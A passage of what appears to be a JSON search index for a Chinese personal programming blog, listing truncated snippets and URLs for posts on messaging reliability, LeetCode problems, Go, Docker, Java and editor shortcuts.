协议本身的 ACK 机制为什么还需要业务层的 ACK 机制？ tcp的ack只能保证连接层的“不丢数据”和“不乱序”，但数据","lvl0":"保证消息的可靠性","lvl1":null,"lvl2":"摘要","objectID":"697b6de94d5b746dcf16492771cb66ce","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B6%88%E6%81%AF%E4%B8%A2%E5%A4%B1%E6%96%B9%E6%A1%88%E8%A7%A3%E5%86%B3/"},{"content":"自动智能扩缩容：直播互动场景中峰值流量的应对 随着近几年各种直播 App 和百万答题 App 的火爆和风靡，具有高实时性要求的直播互动场景开始纷纷借助即时消息","lvl0":"即时消息","lvl1":null,"lvl2":"摘要","objectID":"d2fec61cc4c0b480706e6e8e36244a28","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%8D%B3%E6%97%B6%E6%B6%88%E6%81%AF/"},{"content":"","lvl0":"多终端漫游技术解决方案","lvl1":null,"lvl2":"摘要","objectID":"f77571b1fbf8b9dbda7f8fadd1ef1240","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%BC%AB%E6%B8%B8/"},{"content":"针对超高流量带来的请求压力，业界比较常用的一种方式就是“流控”。 “流控”这个词你应该不陌生，当我们坐飞机航班延误或者被取消时，航空公司给出的","lvl0":"流量控制","lvl1":null,"lvl2":"摘要","objectID":"1ac14090a6f040be7fd6de4b302ec75b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/"},{"content":"消息收发架构 一个传统的视频网站如果想让自己的视频支持弹幕功能，也可以通过引入即时消息的技术，来让视频弹幕的参与者能实时、高效地和其他观看者进","lvl0":"消息表设计","lvl1":null,"lvl2":"摘要","objectID":"773135782cbb36a68c6f8343fcffff7b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81%E6%96%B9%E6%A1%88/"},{"content":"性能调优 那么找到了系统的瓶颈点，我们要如何优化呢？优化方案会随着问题的不同而不同。比方说，如果是数据库访问慢，那么就要看是不是有锁表的情况、","lvl0":"性能调优","lvl1":null,"lvl2":"摘要","objectID":"70cf7405fd188497e7677e196176fa08","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B9%B6%E5%8F%91/%E5%87%BA%E7%8E%B0%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%80%8E%E4%B9%88%E5%88%86%E6%9E%90/"},{"content":"考研408复习笔记 目的专业：计算机科学与技术 预计考研专业课科目：408 （第一次发现原来gayhub也可以用来存放学习笔记哇） 主要包括408以","lvl0":"readme","lvl1":null,"lvl2":"摘要","objectID":"cd6947dec5b2becb03227d65672bc3e2","tags":null,"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02_2.408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%8D%E4%B9%A0/readme/"},{"content":"《计算机网络》复习笔记 这个笔记同时使用了两本教材：《计算机网络：自顶向下方法（原书第六版）》和《计算机网络（谢希仁 第七版）》， 目录结构按照自","lvl0":"计算机网络复习_","lvl1":null,"lvl2":"摘要","objectID":"25a7a3f1d8f03ce02a9a488507b0416d","tags":null,"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02_2.408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%8D%E4%B9%A0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/"},{"content":"127. 单词接龙 Difficulty: 困难 字典 wordList 中从单词 beginWord和 endWord 的 转换序列 是一个按下述规格形成的序列： 序列中第一个单词是 beginWord 。 序列中最后一个单词是 endWord 。 每次","lvl0":"127.单词接龙","lvl1":null,"lvl2":"摘要","objectID":"41258c8f192be5d15277b2e93c331b46","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/bfs%E5%8D%95%E8%AF%8D%E5%8F%98%E6%8D%A2/127.%E5%8D%95%E8%AF%8D%E6%8E%A5%E9%BE%99/"},{"content":"629. K个逆序对数组 Difficulty: 困难 给出两个整数 n 和 k，找出所有包含从 1 到 n 的数字，且恰好拥有 k 个逆序对的不同的数组的个数。 逆序对的定义如下：对于数组的第","lvl0":"629.k个逆序对数组","lvl1":null,"lvl2":"摘要","objectID":"fdd4fd69ac2f08343d49983ca5a6544f","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9E%9A%E4%B8%BE%E4%B8%AA%E6%95%B0/lc.629.k%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/"},{"content":"ac自动机算法 ac自动机图示 KMP 算法原理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;bits/stdc++.h\u0026gt;#define next abcdefg using namespace std; const int MAXN = 1E6+10; int next[MAXN]; int","lvl0":"ac自动机","lvl1":null,"lvl2":"摘要","objectID":"4f327af28f819b850b42cafab1709360","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/ac%E8%87%AA%E5%8A%A8%E6%9C%BA/"},{"content":"axios拦截器","lvl0":"axios拦截器使用","lvl1":null,"lvl2":"摘要","objectID":"ce01363e73ebb3cf37e592a7894a5cea","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/axios%E6%8B%A6%E6%88%AA%E5%99%A8/"},{"content":"chrome快捷键 1. 标签页和窗口快捷键 操作 快捷键 打开新窗口 ⌘ + n 在无痕模式下打开新窗口 ⌘ + Shift + n 打开新的标签页，并跳转到该标签页 ⌘ + t 重新打","lvl0":"chrome快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"20245fa430ca0a27278f943e5c3b14ac","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/chrome-keymap/"},{"content":"trace 可视化编程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;runtime/trace\u0026#34; ) func main() { f, err := os.Create(\u0026#34;trace.out\u0026#34;) if err != nil { panic(err) } defer f.Close() err = trace.Start(f) if err != nil { panic(err) } fmt.Println(\u0026#34;hello world\u0026#34;) trace.Stop() }","lvl0":"debug trace","lvl1":null,"lvl2":"摘要","objectID":"930f5919cf19d16ed0de7a4d0e4c0c31","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%85%AB%E8%82%A1%E6%96%87/debug-trace/"},{"content":"docker 命令演示 --rm 表示临时容器，容器停止 就会删除 -p 指定端口映射 1 2 3 4 5 6 7 8 9 docker run --name myNginx --rm -p 80:80 nginx docker logs myNginx # 进入 虚拟操作系统终端 docker exec -it myNginx bash","lvl0":"docker基本命令学习","lvl1":null,"lvl2":"摘要","objectID":"84b776a3c86b3dcc74ea6c4371595242","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/docker%E5%AD%A6%E4%B9%A0/docker%E5%AD%A6%E4%B9%A0/"},{"content":"参考学习 官网文档 参考视频学习 windows resize事件监听 参考视频 - 8分钟","lvl0":"echarts数据展示","lvl1":null,"lvl2":"摘要","objectID":"ecd9fff21efde864fbef23b40946eeff","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/echarts%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"},{"content":"eclipse快捷键 1. 快捷键 1.1. 编辑 作用域 功能 快捷键 全局 查找并替换 Ctrl+F 文本编辑器 查找上一个 Ctrl+Shift+K 文本编辑器 查找下一个 Ctrl+K 文本编辑器 删除当前行 Ctrl+D 文本编辑","lvl0":"eclipse快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"8d7631cafe4d3d495a27f63a652f2fc0","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/eclipse-keymap/"},{"content":"Feign远程调用 RestTemplate 调用的问题 restTeplate 调用存在以下问题 代码可读性差，编程体验不统一 复杂URL 难以维护 1 2 3 4 5 6 @FeignClient(\u0026#34;userService\u0026#34;) public interface UserClient { @GetMappling(\u0026#34;/api/user/{id}\u0026#34;) User findById(@PathVariable(\u0026#34;id\u0026#34;) String id) } 1 2 3 4 5 6","lvl0":"Feign远程调用","lvl1":null,"lvl2":"摘要","objectID":"dab1c61ea9b16f84fd69eb2688f13d7c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/springcloud/feign%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/"},{"content":"G1收集器优势 G1 可以充分利用服务器多核的优势 并行与并发 分代收集 空间整合 可预测的停顿 【精确指定 垃圾回收时间不超过 m】 G1 后台有一张表 remember set, 对 region 进行","lvl0":"G1收集器优势","lvl1":null,"lvl2":"摘要","objectID":"ead9c0b90111dd9bf015822d60908cf5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/java%E8%B0%83%E4%BC%98/g1%E6%94%B6%E9%9B%86%E5%99%A8/"},{"content":"git 查看远程分支 1 git","lvl0":"Git 查看远程分支","lvl1":null,"lvl2":"摘要","objectID":"5175192443e0b3102d021cbfd607e5af","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/git/git-%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/"},{"content":"参考项目 参考视频 CI 和 CD 的概念 CI很容易理解，就是持续集成。但是CD既可以指代码持续交付，也可理解为代码持续部署。CI和CD之间有很多相似的部","lvl0":"github action使用方法","lvl1":null,"lvl2":"摘要","objectID":"bc4e869b7415a42b4ce1aa5da6430786","tags":["CI/CD"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80/ci-and-cd/github-action/"},{"content":"golang HTML 白名单 golang HTML 白名单工具 java html 白名单工具 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package html import \u0026#34;github.com/microcosm-cc/bluemonday\u0026#34; func PreventXSS(html string) string { var policy = bluemonday.NewPolicy() policy.AllowStandardURLs() policy.AllowAttrs(\u0026#34;href\u0026#34;).OnElements(\u0026#34;a\u0026#34;) policy.AllowElements(\u0026#34;p\u0026#34;) policy.AllowElements(\u0026#34;div\u0026#34;) policy.AllowAttrs(\u0026#34;src\u0026#34;).OnElements(\u0026#34;img\u0026#34;) return policy.Sanitize(html) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14","lvl0":"golang HTML白名单","lvl1":null,"lvl2":"摘要","objectID":"d6f7f5f626e92cd8a0a426d00e495c7f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-html-%E7%99%BD%E5%90%8D%E5%8D%95/"},{"content":"给定单向链表的一个节点指针，定义一个函数在O(1)时间删除该结点。 假设链表一定存在，并且该节点一定不是尾节点。 样例 1 2 3 4 输入：链表 1-\u0026gt;4-\u0026gt;6-\u0026gt;8 删掉节","lvl0":"Golang 刷题入门 _o(1)时间删除链表节点","lvl1":null,"lvl2":"摘要","objectID":"067654df79e80dab07cd3a6f3f8610cb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E9%93%BE%E8%A1%A8/o1%E6%97%B6%E9%97%B4%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8_go/"},{"content":"输入一行字符，长度不超过 100100，请你统计一下其中的数字字符的个数。 输入格式 输入一行字符。注意其中可能包含空格。 输出格式 输出一个整数，表","lvl0":"Golang 刷题入门_字符串中数字的个数","lvl1":null,"lvl2":"摘要","objectID":"609144655c1d55e93840868d4b544eaa","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E6%95%B0%E5%AD%97%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"content":"输入一个二维数组 M[12][12]M[12][12]，根据输入的要求，求出二维数组的右下半部分元素的平均值或元素的和。 右下半部分是指次对角线","lvl0":"Golang 刷题入门_数组的右下半部分","lvl1":null,"lvl2":"摘要","objectID":"7a23a7ccc32acb79d69eae2b3b4c5fef","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%B3%E4%B8%8B%E5%8D%8A%E9%83%A8%E5%88%86/"},{"content":"给定一个由大小写字母构成的字符串。 把该字符串中特定的字符全部用字符 # 替换。 请你输出替换后的字符串。 输入格式 输入共两行。 第一行包含一个长度不超","lvl0":"Golang 刷题入门_替换字符串","lvl1":null,"lvl2":"摘要","objectID":"9b929201307f89cec3110424da35dc74","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E6%9B%BF%E6%8D%A2%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"给定一个字符串 aa，请你按照下面的要求输出字符串 bb。 给定字符串 aa 的第一个字符的 ASCII 值加第二个字符的 ASCII 值，得到 bb 的第一个字符； 给定字符串 aa 的第","lvl0":"Golang 刷题入门_输出字符串","lvl1":null,"lvl2":"摘要","objectID":"7e6f950a6a3d812f362d9473a3526cfc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"golang 早期调度的实现原理 老调度器的几个缺点： 创建、销毁、调度 goroutine 都需要每个 M获取锁， 这就形成了激烈的锁竞争。 M 转移 G 会造成延迟和额外的系统负载 系统","lvl0":"golang 早期调度器的实现原理","lvl1":null,"lvl2":"摘要","objectID":"14359605012b234e6c15974b5dd4da5b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%85%AB%E8%82%A1%E6%96%87/%E6%97%A9%E6%9C%9Fgo%E8%AF%AD%E8%A8%80%E8%B0%83%E5%BA%A6%E5%8E%9F%E7%90%86/"},{"content":"golang 生成验证码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package captcha import ( \u0026#34;github.com/gin-contrib/sessions\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; \u0026#34;image/color\u0026#34; \u0026#34;image/png\u0026#34; \u0026#34;github.com/afocus/captcha\u0026#34; ) //生成","lvl0":"Golang 生成验证码","lvl1":null,"lvl2":"摘要","objectID":"21844135b7ae4ca30bcbe459c1007a66","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"content":"golang 项目打包脚本 1 2 3 4 5 6 7 8 set GOARCH=amd64 set GOOS=linux go build -tags=jsoniter main.go 上传服务器 1 2 3 4 5 6 7 scp ./main myBlog:/root/spider_APP/ scp -r static myBlog:/root/spider_APP/ ssh myBlog","lvl0":"golang 项目打包脚本","lvl1":null,"lvl2":"摘要","objectID":"35fa60afb5082501b8df29945c0715b2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E8%84%9A%E6%9C%AC/"},{"content":"golang 动态执行脚本 golang 需要编译，但是 有时候我需要动态语言的特性，就需要动态执行脚本 更多 gopher-luar 和 starlark-go-lib 已经把在 gopher-lua 和 starlark-go 中使用 go 语言的第三方包变得极其容易。当然","lvl0":"Golang动态执行脚本","lvl1":null,"lvl2":"摘要","objectID":"bf63f4993000e9f80739b0ba17f0ae89","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%AA%9A%E6%93%8D%E4%BD%9C/%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"},{"content":"golang爬取网页乱码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58","lvl0":"GOLANG爬取网页乱码","lvl1":null,"lvl2":"摘要","objectID":"fe96634757d787d7397c32a556646e32","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-%E7%88%AC%E8%99%AB%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"content":"golang GMP模型 学习教程, 看11分钟 一个进程 可以有多个线程 ，每个线程 有多个协程 协程和线程的关系 N：M原理 一个协程可以挂到不同的线程上面去，所以是","lvl0":"golang的 GMP模型","lvl1":null,"lvl2":"摘要","objectID":"313c52396a0e2299f5aae8d771f0ef4c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E5%85%AB%E8%82%A1%E6%96%87/golang%E7%9A%84-gmp%E6%A8%A1%E5%9E%8B/"},{"content":"hibernate validator 使用方法 JSR-303 Bean validation 是一个规范， 提供了大量的注解接口等。 validated 和 valid 的区别 @Valid：没有分组的功能。 @Valid：可以用在方法、构造函数、方法参","lvl0":"hibernate validator框架的使用","lvl1":null,"lvl2":"摘要","objectID":"989bf047c620e78f97b533e768e00b67","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/validator/validator%E6%A1%86%E6%9E%B6/"},{"content":"本文由网络文章整理备份。 iterm2 rz与sz的功能 本文主要介绍mac环境下使用iterm2的rz sz功能的安装流程。 1. 安装lrzsz 1 brew install lrzsz 2. 安装执","lvl0":"iterm2-rzsz","lvl1":null,"lvl2":"摘要","objectID":"ec5dda4b7982f7df05ef587556aea56a","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/iterm2-rzsz/"},{"content":"JWT token适配 参考视频","lvl0":"JWT token 视频方法","lvl1":null,"lvl2":"摘要","objectID":"3d9188fa418b1cc0a3dd3ec48908802d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/jwt-token-%E9%80%82%E9%85%8D%E6%96%B9%E6%B3%95/"},{"content":"1035. 不相交的线 Difficulty: ** 示例 2： 输入：nums1 = [2,5,1,2,5], nums2 = [10,5,2,1,5,2] 输出：3 示例 3： 输入：nums1 = [1,3,7,1,7,5], nums2 = [1,9,2,5,1] 输出：2 ** 在两条独立的水平线上按给定的顺序写下 nums1","lvl0":"lc.1035.不想交的线【最长公共上升子序列】","lvl1":null,"lvl2":"摘要","objectID":"48b0c13f775991416f1721b569598e51","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB%E9%97%AE%E9%A2%98%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.1035.%E4%B8%8D%E6%83%B3%E4%BA%A4%E7%9A%84%E7%BA%BF%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97%E5%8F%98%E9%A2%98/"},{"content":"1360. 日期之间隔几天 Difficulty: 简单 请你编写一个程序来计算两个日期之间隔了多少天。 日期以字符串形式给出，格式为 YYYY-MM-DD，如示例所示。 示例 1： 1","lvl0":"lc.1360.日期之间隔几天","lvl1":null,"lvl2":"摘要","objectID":"36d0c62c62635e221792cb77e79c6759","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%97%B6%E9%97%B4/lc.1360.%E6%97%A5%E6%9C%9F%E4%B9%8B%E9%97%B4%E9%9A%94%E5%87%A0%E5%A4%A9/"},{"content":"1363. 形成三的最大倍数 Difficulty: 困难 给你一个整数数组 digits，你可以通过按任意顺序连接其中某些数字来形成 3 的倍数，请你返回所能得到的最大的 3 的倍数。","lvl0":"lc.1363.形成3的最大倍数","lvl1":null,"lvl2":"摘要","objectID":"a1b91c6acffa373792aa073414008c83","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85%E5%8F%98%E9%A2%98/lc.1363.%E5%BD%A2%E6%88%903%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%8D%E6%95%B0/"},{"content":"1367. 二叉树中的列表 Difficulty: 中等 给你一棵以 root 为根的二叉树和一个 head 为第一个节点的链表。 如果在二叉树中，存在一条一直向下的路径，且每个点的数值恰好一一对应","lvl0":"lc.1367.二叉树的列表","lvl1":null,"lvl2":"摘要","objectID":"a7a67abfca2918c0d379a9d3b2d710c3","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95/lc.1367.%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E5%88%97%E8%A1%A8/"},{"content":"1390. 四因数 Difficulty: 中等 给你一个整数数组 nums，请你返回该数组中恰有四个因数的这些整数的各因数之和。 如果数组中不存在满足题意的整数，则返回 0 。 示例：","lvl0":"lc.1390.四因数","lvl1":null,"lvl2":"摘要","objectID":"3ea8eba6204d617b8f01d87d4d4c8b05","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E5%AD%A6/%E5%88%86%E8%A7%A3%E5%9B%A0%E6%95%B0%E4%B8%93%E9%A2%98/lc.1390.%E5%9B%9B%E5%9B%A0%E6%95%B0/"},{"content":"1392. 最长快乐前缀 Difficulty: 困难 「快乐前缀」是在原字符串中既是 非空 前缀也是后缀（不包括原字符串自身）的字符串。 给你一个字符串 s，请你返回它的 最长快乐前缀","lvl0":"lc.1392.最长快乐前缀","lvl1":null,"lvl2":"摘要","objectID":"235a83dddf06adaa971015a272bf5677","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/kmp%E7%AE%97%E6%B3%95/lc.1392.%E6%9C%80%E9%95%BF%E5%BF%AB%E4%B9%90%E5%89%8D%E7%BC%80/"},{"content":"1957. 删除字符使字符串变好 Difficulty: 简单 一个字符串如果没有 三个连续 相同字符，那么它就是一个 好字符串 。 给你一个字符串 s ，请你从 s 删除 最少 的字符，使它变成一","lvl0":"lc.1957.删除字符串使字符串变好","lvl1":null,"lvl2":"摘要","objectID":"d4bdaf8d3dcf9179a5f35b65f8b38c3d","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/lc.1957.%E5%88%A0%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%A5%BD/"},{"content":"354. 俄罗斯套娃信封问题 Difficulty: 困难 给你一个二维整数数组 envelopes ，其中 envelopes[i] = [w\u0026lt;sub style=\u0026quot;display: inline;\u0026quot;\u0026gt;i\u0026lt;/sub\u0026gt;, h\u0026lt;sub style=\u0026quot;display: inline;\u0026quot;\u0026gt;i\u0026lt;/sub\u0026gt;] ，表示第 i 个信封的宽度和高度。 